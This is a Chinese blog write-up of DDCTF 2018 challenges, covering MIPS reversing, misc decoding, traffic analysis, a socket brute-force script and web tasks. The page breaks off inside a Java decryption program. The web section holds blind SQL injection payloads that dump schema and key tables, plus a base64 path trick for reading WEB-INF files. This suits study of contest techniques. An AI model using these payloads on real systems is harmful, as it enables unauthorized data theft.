@@ -1,0 +1,1329 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="N0rth3ty">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="N0rth3ty">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="每一顶白帽都有一道黑边">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>DDctf_Writrup · N0rth3ty&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/img/a.jpg" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >N0rth3ty&#39;s Blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">DDctf_Writrup</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>N0rth3ty's Blog.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/img/02.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            DDctf_Writrup
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "WP">WP</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">2.4k</span>阅读时长: <span class="post-count reading-time">11 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/04/22</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>第一次参加个人赛，被web4区块链卡住了，凭借杂项和一个简单的re侥幸拿了位次<br>web2也暴露出一些问题，java基本功太差，不然也不至于卡那么久<br><a id="more"></a></p>
+<h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="Baby-MIPS"><a href="#Baby-MIPS" class="headerlink" title="Baby MIPS"></a>Baby MIPS</h2><p>下载下来程序，听说是mips的指令集，就去虚拟机里装了一个qemu，跑了一下结果崩掉了<br>然后用IDA打开F5，结果竟然发现IDA的那个插件不支持mips的F5<br>上网搜了一波得知可以用retdec在线反编译整个程序，于是就注册了一个账号，上传这个题目，得到反编译好的c源码<br>查找字符串”Wrong”，到这里</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sub_400420();</span><br><span class="line">if (g27 == 0) &#123;</span><br><span class="line">    // 0x403760</span><br><span class="line">    g1 = (int32_t)&quot;Wrong&quot;;</span><br><span class="line">    sub_4037A0();</span><br><span class="line">    // branch -&gt; 0x40377c</span><br></pre></td></tr></table></figure>
+<p>发现sub_400420这个函数出来就判断g27的值，那这个函数肯定有鬼，于是查看这个函数<br>看到了一堆等式，后来仔细一看也没有看出来个什么东西，就把这个函数和全局变量copy出来，用vs重新编译了一遍<br>结果编译报错说有未初始化的变量被使用，下面这种类型的代码（大概是这样，最初那份反编译结果找不到了）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int v1;</span><br><span class="line">int v3;</span><br><span class="line">int32_t v26 = v1 * v25 + 0xee05 * v22 + v3 * v21 + 0x84ef * v20 + 0x9d3b * v19 + 0x4f76 * v18 + 0x518a * v16 +</span><br><span class="line">0xaaa1 * v14 + 0xad5a * v10 + v3 * -0xfdc8 - 0xc8f5 * v4 - 3656 * v6 - 0xde47 * v8 - 0xb123 * v12 - 0x94a1 * v23 - 0x6db0 * v24;</span><br></pre></td></tr></table></figure>
+<p>这变量不初始化不就是随机的吗，哪有解，越想越荒唐，于是又到ida里去看了一下，发现这种东西：</p>
+<p><img src="/img/2_6.png" alt="image"></p>
+<p><img src="/img/2_7.png" alt="image"></p>
+<p>而且这些绿块有个共性，都是EB02开头。jmp指令的x86字节码就是EB，02的话就是往后跳俩字节<br>想到这里突然觉得这不会是作者提示你要把这个EB02xxxx给跳过吧。于是搜了一下mips的nop，得知是00000000<br>写了一个工具把文件里的EB02xxxx都给换成了00000000：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	FILE *file;</span><br><span class="line">	fopen_s(&amp;file, <span class="string">"baby_mips"</span>, <span class="string">"rb+"</span>);</span><br><span class="line">	fseek(file, <span class="number">0</span>, SEEK_END);</span><br><span class="line">	<span class="keyword">int</span> size = ftell(file);</span><br><span class="line">	fseek(file, <span class="number">0</span>, SEEK_SET);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span>* buffer = <span class="keyword">new</span> <span class="keyword">unsigned</span> <span class="keyword">char</span>[size];</span><br><span class="line">	<span class="built_in">memset</span>(buffer, <span class="number">0</span>, size);</span><br><span class="line">	fread(buffer, <span class="number">1</span>, size, file);</span><br><span class="line">	fclose(file);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0x240</span>; i &lt; <span class="number">0x3234</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> ((buffer[i] == <span class="number">0xeb</span>) &amp;&amp; (buffer[i + <span class="number">1</span>] == <span class="number">0x02</span>) &amp;&amp; (i%<span class="number">4</span> == <span class="number">0</span>)) &#123; <span class="comment">//mips指令四字节对齐，我们只改对齐处的指令</span></span><br><span class="line">			buffer[i] = buffer[i + <span class="number">1</span>] = buffer[i + <span class="number">2</span>] = buffer[i + <span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	fopen_s(&amp;file, <span class="string">"baby_mips_patched"</span>, <span class="string">"wb+"</span>);</span><br><span class="line">	fwrite(buffer, <span class="number">1</span>, size, file);</span><br><span class="line">	fclose(file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后重复之前的步骤，反编译出来的结果就很好看了，16个等式，每个等式包含16个变量，变量前都有已经初始化的系数<br>于是继续拖进vs编译成x86，然后用ida的F5插件看x86的反汇编就非常清楚了<br>写脚本，把等式的系数按照顺序都提取出来，组成一个矩阵，然后输入到matlab里通过逆矩阵求解一下，就得到了flag的ascii码</p>
+<p>……脚本不见了，难度不大，用”*”符号定位，用一个二维数组存系数矩阵就行</p>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="╯°□°）╯︵-┻━┻"><a href="#╯°□°）╯︵-┻━┻" class="headerlink" title="(╯°□°）╯︵ ┻━┻"></a>(╯°□°）╯︵ ┻━┻</h2><p>明显是16进制的密文，两位一转转成10进制，用ascii编码发现是乱码<br>细心观察以下会发现，所有ascii码都在扩展ascii里面，再结合翻桌子的一个脑洞<br>每组数字减去128，再用ascii编码<br>脚本写得丑<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">'密文'</span></span><br><span class="line">st =a[:<span class="number">2</span>]</span><br><span class="line">flag =<span class="string">''</span></span><br><span class="line">symbol = len(a[<span class="number">2</span>:])</span><br><span class="line"><span class="keyword">while</span> symbol &gt; <span class="number">0</span>:</span><br><span class="line">    st = a[:<span class="number">2</span>]</span><br><span class="line">    t = int(st,<span class="number">16</span>)<span class="number">-128</span></span><br><span class="line">    flag = flag + chr(t)</span><br><span class="line">    a = a[<span class="number">2</span>:]</span><br><span class="line">    symbol = len(a[<span class="number">2</span>:])</span><br><span class="line">t = int(a,<span class="number">16</span>)<span class="number">-128</span></span><br><span class="line">flag = flag + chr(t)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></p>
+<h2 id="第四扩展FS"><a href="#第四扩展FS" class="headerlink" title="第四扩展FS"></a>第四扩展FS</h2><p>图片分析拿到自然是binwalk跑一下，跑出一个压缩包，但不知道为啥我打开就说文件损坏<br>一直试图修复文件，无果<br>感觉可能是自己环境的问题(去尼玛的明明是出题背锅好嘛<br>后来直接用7z打开，竟然可以直接解压数据出来，玄学<br><img src="/img/2_1.png" alt="image"><br>密码在图片属性，备注里面，解压出来发现有是类似flag的字符，大概都能想到是频次排个序了，而且题目也提到了频次<br>写个py脚本跑一下getflag，脚本就不放了</p>
+<h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><p>先筛选一下tcp流，看到有smtp，那先分析一波smtp<br>筛选出smtp，在标志DATA的包中追踪下tcp流，看看具体发送的数据，前面都没有什么有用的信息<br>然后可以发现发送了一段base64的数据<br><img src="/img/2_2.png" alt="image"><br>写个py脚本编码一下可以输出一张图片<br><img src="/img/2_3.png" alt="image"><br>能看出是个私钥，提取出来<br>ocr了解个屁，手机QQ了解一下<br>我直接用的手机QQ的提取图片中文字的功能，不过有的地方会出错，人工校对一下，可以核对提示中的md5<br>补全私钥格式，解密ssl流量<br>可以看到http包，追踪ssl流，getflag<br><img src="/img/2_4.png" alt="image"></p>
+<h2 id="安全通信"><a href="#安全通信" class="headerlink" title="安全通信"></a>安全通信</h2><p>控制agentid长度<br>然后跑最后一位,顺次爆破<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">from socket import *</span><br><span class="line"></span><br><span class="line">def nc(mission,agentid):</span><br><span class="line">    global symbol</span><br><span class="line">    s = socket(AF_INET,SOCK_STREAM)</span><br><span class="line">    address = (&quot;116.85.48.103&quot;, 5002)</span><br><span class="line">    s.connect(address)</span><br><span class="line">    smission = mission + &apos;\n&apos;</span><br><span class="line">    smission = bytes(smission,encoding = &apos;ascii&apos;)</span><br><span class="line">    s.send(smission)</span><br><span class="line">    s.recv(1024)</span><br><span class="line">    sagentid = agentid + &apos;\n&apos;</span><br><span class="line">    sagentid = bytes(sagentid,encoding = &apos;ascii&apos;)</span><br><span class="line">    s.send(sagentid)</span><br><span class="line">    s.recv(1024)</span><br><span class="line">    symbol = str(s.recv(1024))[2:].partition(&apos;\\n&apos;)[0]</span><br><span class="line">    #print(symbol)</span><br><span class="line">    return s</span><br><span class="line"></span><br><span class="line">def burst(n,tem,m,s):</span><br><span class="line">    message = &quot;Connection for mission: %s, your mission&apos;s flag is: %s%c\n&quot; % (&apos;0&apos; * n, tem, m)</span><br><span class="line">    print(message)</span><br><span class="line">    message = bytes(message,encoding = &apos;ascii&apos;)</span><br><span class="line">    s.send(message)</span><br><span class="line">    m = s.recv(1024)</span><br><span class="line">    test = str(m)[2:].partition(&apos;\\n&apos;)[0]</span><br><span class="line">    s.recv(1024)</span><br><span class="line">    return test</span><br><span class="line"></span><br><span class="line">mission = &apos;2acba569d223cf7d6e48dee88378288a&apos;</span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">symbol =&apos;&apos;</span><br><span class="line">end = 0</span><br><span class="line">for i in range(1,62):</span><br><span class="line">    n = 62 - i</span><br><span class="line">    agentid = &apos;0&apos;*n</span><br><span class="line">    s = nc(mission,agentid)</span><br><span class="line">    for m in range(33,128):</span><br><span class="line">        t = burst(n,flag,m,s)</span><br><span class="line">        l = len(t)</span><br><span class="line">        if symbol[:l] == t:</span><br><span class="line">            flag = flag + chr(m)</span><br><span class="line">            #print(chr(m))</span><br><span class="line">            break</span><br><span class="line">        if i == 127:</span><br><span class="line">            end = 1</span><br><span class="line">    s.close()</span><br><span class="line">    print(flag)</span><br><span class="line">    if end == 1:</span><br><span class="line">        break</span><br></pre></td></tr></table></figure></p>
+<p>多跑几次，老是卡。。</p>
+<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="数据库的秘密"><a href="#数据库的秘密" class="headerlink" title="数据库的秘密"></a>数据库的秘密</h2><p>改一下最常见的xff进去，审查元素（web选手职业病<br>发现hidden了一个author栏，用脚想也知道是注入点，那就注入一波。<br>先手动分析一波<br><img src="/img/2_5.png" alt="image"><br>有个很明显的sig和time参数，应该是作为校验的<br>从源码可以看到这是调用的js对查询数据进行了加密，注意key也在源码中<br>然后又是个bool注入<br>那思路就很明显了，需要本地写个脚本对查询参数参数加密并构造请求进行爆破<br>然后js直接拖下来就行了，py有个pyexexjs的模块可以运行js，脚本不放了，挂上payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">11&apos;|| (ASCII(SUBSTR((SELECT GROUP_CONCAT(DISTINCT table_name,0x23,table_schema) </span><br><span class="line">FROM Information_schema.tables WHERE table_schema&lt;&gt;0x696E666F726D6174696F6E5F736368656D61),1,1)))=32#</span><br><span class="line"></span><br><span class="line">11&apos;|| (ASCII(SUBSTR((SELECT column_name FROM information_schema.columns where table_name=0x6374665F6B657935),1,1)))=32#</span><br><span class="line"></span><br><span class="line">11&apos;|| (ASCII(SUBSTR((SELECT secvalue FROM ddctf.ctf_key5),1,1)))=32#</span><br></pre></td></tr></table></figure></p>
+<p>吐槽一下网站很卡，容易出错<br>多跑几次汇总getflag</p>
+<h2 id="专属链接"><a href="#专属链接" class="headerlink" title="专属链接"></a>专属链接</h2><p>源码泄露，测目录姿势<br><a href="http://116.85.48.102:5050/image/banner/+base64(path)" target="_blank" rel="noopener">http://116.85.48.102:5050/image/banner/+base64(path)</a><br>GitHub上也有这个框架<br><a href="https://github.com/tangzhezhi/springmvc/tree/master/WebRoot/WEB-INF" target="_blank" rel="noopener">https://github.com/tangzhezhi/springmvc/tree/master/WebRoot/WEB-INF</a><br>还有一处提示报错<br><a href="http://116.85.48.102:5050/flag/testflag/1" target="_blank" rel="noopener">http://116.85.48.102:5050/flag/testflag/1</a><br>然后主要是这几个文件<br>…/…/WEB-INF/classes/com/didichuxing/ctf/listener/InitListener.class<br>…/…/WEB-INF/classes/com/didichuxing/ctf/service/FlagService.class<br>…/…/WEB-INF/classes/com/didichuxing/ctf/controller/user/FlagController.class<br>审计一下<br>/flag/getflag可以获得flag的密文，解密一下即可<br>注意这里是用公钥进行解密<br>脚本找不到了，又重新糊了一份<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintStream;</span><br><span class="line"><span class="keyword">import</span> java.security.InvalidKeyException;</span><br><span class="line"><span class="keyword">import</span> java.security.Key;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyStore;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyStoreException;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> java.security.PrivateKey;</span><br><span class="line"><span class="keyword">import</span> java.security.PublicKey;</span><br><span class="line"><span class="keyword">import</span> java.security.SecureRandom;</span><br><span class="line"><span class="keyword">import</span> java.security.cert.Certificate;</span><br><span class="line"><span class="keyword">import</span> java.security.UnrecoverableKeyException;</span><br><span class="line"><span class="keyword">import</span> java.security.cert.CertificateException;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.BadPaddingException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.IllegalBlockSizeException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Mac;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.NoSuchPaddingException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">hexString2binaryString</span><span class="params">(String hexString)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (hexString == <span class="keyword">null</span> || hexString.length() % <span class="number">2</span> != <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        String bString = <span class="string">""</span>, tmp;</span><br><span class="line">        <span 